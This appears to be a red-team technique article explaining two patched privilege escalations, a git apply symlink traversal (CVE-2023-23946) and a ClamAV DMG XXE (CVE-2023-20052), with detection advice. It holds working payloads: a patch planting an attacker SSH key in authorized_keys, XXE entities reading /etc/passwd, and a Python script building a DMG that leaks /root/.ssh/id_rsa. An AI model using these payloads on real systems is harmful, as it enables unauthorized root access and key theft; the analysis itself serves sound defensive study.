---
title: "Git Symlinks and ClamAV XXE — Two Local Privilege Escalations"
description: "Two local privilege escalation vulnerabilities that were patched in early 2023 but remain present in unpatched systems: CVE-2023-23946, a symlink path traversal in git apply, and CVE-2023-20052, an XML External Entity in ClamAV's DMG parser. This article explains the mechanics of each, why they work in restrictive environments, and how the exploits are constructed."
date: 2026-10-26
type: "Technique · Privilege Escalation"
category: "Red Team"
difficulty: "Advanced"
readingTime: 18
tags: [cve-2023-23946, cve-2023-20052, git, clamav, privilege-escalation, xxe, symlink, cwe-22, cwe-611]
draft: false
---

## The premise

A sudoers rule that restricts a command is not the same as a sudoers rule that restricts its effect. The two are often conflated in practice: an administrator grants `git apply` because it seems constrained, or grants `clamscan --debug` on a specific directory because the directory is inside the user's home. Both grants appear safe. Both can be abused.

This article covers two privilege escalation vulnerabilities that exploit exactly that gap:

- **CVE-2023-23946** — a symlink path traversal in `git apply` that allows a crafted patch to write files outside the repository working tree.
- **CVE-2023-20052** — an XML External Entity (XXE) in ClamAV's DMG parser that allows a malicious DMG to leak arbitrary file contents through the debug output.

Neither vulnerability is novel. Both were patched in early 2023 and both had public exploits shortly after. Their usefulness in an engagement comes from the fact that patching is slow, and sudoers rules that were written years ago frequently survive untouched.

For the full assessment that used both chains, see: **[DNS Spoofing to Root — LFI, Credential Interception and Two Chained CVEs →](/projects/dns-spoofing-to-root-compromise)**.

## Part One — The `git apply` security model

`git apply` reads a patch file and applies the described changes to a working tree. The patch format is a subset of `diff` output with metadata that identifies the source and destination paths for each change.

A patch entry looks like this:

```
diff --git a/file.txt b/file.txt
index 0000000..1111111
--- a/file.txt
+++ b/file.txt
@@ -1,3 +1,3 @@
 line 1
-line 2 (old)
+line 2 (new)
 line 3
```

The `a/` and `b/` prefixes are conventional. Git strips them during application and resolves the resulting path relative to the working tree root. If the resolved path is outside the working tree, `git apply` refuses the patch.

The path resolution is where the vulnerability lives. Before CVE-2023-23946, `git apply` resolved the destination path by simple path concatenation. It checked whether the final path stayed within the working tree, but it did not check whether any intermediate path component was a symlink. If the path went through a symlink, the actual file being written was the symlink's target — which could be anywhere on the filesystem.

The fix in Git 2.39.2 added a check that verifies every path component is not a symlink before the write proceeds. The patch also added a check for the case where the symlink is created and then immediately used in the same patch. Before the fix, a patch that both created a symlink and wrote through it would succeed.

## Part Two — CVE-2023-23946 mechanics

The vulnerability requires a repository that already contains a symlink, and a patch that abuses it.

The setup: a repository is initialized in a directory writable by the attacker. A symlink is created and committed to the repository. The symlink points to a directory outside the repository, such as a user's home directory or a sensitive configuration directory.

```bash
git init repo && cd repo
ln -s /home/victim/.ssh symlink
git add symlink
git commit -m "add symlink"
```

At this point, the repository has a tracked symlink called `symlink` that points to `/home/victim/.ssh`.

The exploit: a patch that renames the symlink and, in the same patch, writes a file under the renamed path. Git's patch application reads the rename directive, updates the internal path resolution, and then processes the new-file directive. Because it does not verify that the renamed path is not a symlink before writing the new file, the write goes through the symlink and lands at `/home/victim/.ssh/<newfile>`.

```
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100600
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-ed25519 AAAA... attacker@kali
```

The `similarity index 100%` tells Git that the rename is a pure rename with no content change, which lets it skip reading the file. The second entry creates a file under `renamed-symlink/`, which resolves to the symlink target `/home/victim/.ssh/authorized_keys`.

When `git apply` is run, the operation succeeds. The `authorized_keys` file now contains the attacker's public key, granting them SSH access as the victim.

The bypass works because the vulnerability is not in the path validation for a single entry. It is in the assumption that the working tree's contents are trustworthy. If the repository was cloned from a trusted source and the patches are reviewed, the assumption holds. If the repository is controlled by the attacker, or the patch is controlled by the attacker, the assumption is false.

## Part Three — Why this bypasses sudoers

The sudoers rule in the assessment restricted `git apply` to a specific filename pattern:

```
(cbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

The intent was clear: allow `git apply` only with the `-v` flag and a filename matching the pattern, which prevents arbitrary command execution through the filename. What the rule does not control is the content of the patch file. The patch can be anything that `git apply` accepts, including a patch that exploits CVE-2023-23946.

This is a general pattern in sudoers rules: a rule restricts the command and its arguments, but not the arguments' content. If the content is processed by the command in a way that has security implications, the rule does not prevent that implication.

For `git apply`, the implication is writes outside the working tree. For `tar`, the implication is path traversal. For `unzip`, the implication is overwriting files outside the target directory. For any program that interprets a file's content to determine what filesystem operations to perform, the safety of the operation depends on the safety of the content, not on the safety of the command.


## Part Four — The ClamAV DMG parser

ClamAV's DMG parser handles Apple Disk Image files. A DMG has a binary structure: a sequence of "koly" trailers at the end of the file that point back to internal data structures, including a property list (plist) that describes the disk image's contents.

The plist is XML. It uses standard XML features — elements, attributes, entities — to describe the volumes, partitions, and metadata of the disk image.

Before CVE-2023-20052, ClamAV's plist parser accepted external entities by default. In an XML document, an external entity is a reference that instructs the parser to fetch and substitute content from another source. For example:

```xml
<!DOCTYPE plist [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<plist>
    <dict>
        <key>content</key>
        <string>&xxe;</string>
    </dict>
</plist>
```

When a parser that supports external entities processes this document, it replaces `&xxe;` with the contents of `/etc/passwd`. If the parsed result is then used in a way that reflects back to the attacker — for example, in debug logging — the file contents are disclosed.

ClamAV used to parse plists without disabling external entity resolution. The fix in 1.0.1 was a configuration change that disabled external entities for DMG plists. The change is one line in the parser setup, but its absence allowed arbitrary file read.

## Part Five — CVE-2023-20052 mechanics

The vulnerability requires the attacker to control a DMG file that ClamAV will scan. In a properly configured environment, this does not happen — ClamAV scans files from trusted sources, or it scans untrusted files in a sandbox, not as root.

The vulnerability becomes exploitable when the sudoers rule allows a specific user to run `clamscan --debug` as root on files that the user can place in a directory:

```
(sbrown) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

The rule permits `--debug`, which is the flag that produces verbose logging. The verbose log reflects the resolved plist contents, which is where the XXE disclosure happens.

The exploit construction is straightforward. A valid DMG is generated with any content, then patched to replace the plist's `blkx` key with an XML entity reference. The entity itself points to the file the attacker wants to read.

```python
import struct, re

data = bytearray(open("base.dmg", "rb").read())
trailer = data[-512:]
assert trailer[:4] == b"koly"

xml_off = struct.unpack(">Q", trailer[0xD8:0xE0])[0]
xml_len = struct.unpack(">Q", trailer[0xE0:0xE8])[0]
xml = bytes(data[xml_off:xml_off + xml_len])

doctype = b'<!DOCTYPE plist [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]>'
xml = re.sub(rb"<!DOCTYPE[^>]*>", doctype, xml, count=1)
xml = xml.replace(b"<key>blkx</key>", b"<key>&xxe;</key>", 1)

new_data = bytes(data[:xml_off]) + xml + bytes(data[xml_off + xml_len:-512])
new_trailer = bytearray(trailer)
new_trailer[0xE0:0xE8] = struct.pack(">Q", len(xml))
new_data += bytes(new_trailer)

open("exploit.dmg", "wb").write(new_data)
```

The key operation is the `<key>blkx</key>` replacement. The `blkx` key is normally an array of block table entries. When the parser processes `<key>&xxe;</key>`, it resolves the entity and tries to parse the file contents as a block table. The block table parser expects a specific format — the string `blkx` followed by a binary structure — and rejects anything else. But the rejection includes the unexpected content in the debug output, which is what the attacker reads.

The disclosure happens at the point of rejection, not at the point of successful parse. The parser is doing what it is supposed to do — validating the block table — but the debug log captures the failure with enough context to reveal the referenced content.

## Part Six — Detection

Both vulnerabilities are detectable through the same class of telemetry that catches most local privilege escalations:

**For CVE-2023-23946:**

- Logs of `git apply` invocations, including the patch filename and the working directory. A patch applied from a directory under `/dev/shm` or `/tmp` is unusual.
- Filesystem events that show writes to `~/.ssh/authorized_keys` or `~/.bashrc` occurring under a `git apply` invocation.
- Anomalous sudo invocations — `git apply` invoked by a user who does not normally use Git, especially immediately after a privilege transition.

**For CVE-2023-20052:**

- Logs of `clamscan` invocations with `--debug`. The debug flag is verbose and slow; in production it is rarely used.
- Filesystem events that show files being created in a directory that is being scanned with elevated privileges.
- Filesystem events that show the same file being scanned multiple times in rapid succession — a sign of an attacker iterating on the XXE payload.

**Both cases:**

- The root cause is the same class of issue: a sudoers rule that restricts the command but not its arguments. Logging the arguments, the working directory, and the output of every sudo invocation is the baseline. Correlating those logs with filesystem events is what catches the actual exploitation.

## Takeaway

The two CVEs covered here are not interesting because they are novel. They are interesting because they exploit a pattern that is ubiquitous: software that trusts its input, and sudoers rules that trust their commands.

`git apply` trusts the repository working tree to be free of symlinks. When the working tree contains a symlink, the patch application can be redirected outside the tree, and the sudoers rule that grants `git apply` does not prevent that redirect.

ClamAV trusts the plist's XML entities to be defined inline. When the plist contains a reference to an external file, the parser resolves it and the debug output reveals the result. The sudoers rule that grants `clamscan --debug` on files inside a directory does not prevent the file from referencing anything it wants.

The general lesson is that **sudoers rules are not security boundaries**. They are operational conveniences with specific effects. A rule that grants a command is a rule that grants everything that command can do, with whatever input the user can provide.

For the credentials access techniques that preceded the escalation in the assessment, see: **[Intercepting Credentials — DNS Manipulation and SSH Honeypots →](/research/intercepting-credentials-dns-ssh)**. For the full assessment, see: **[DNS Spoofing to Root →](/projects/dns-spoofing-to-root-compromise)**.
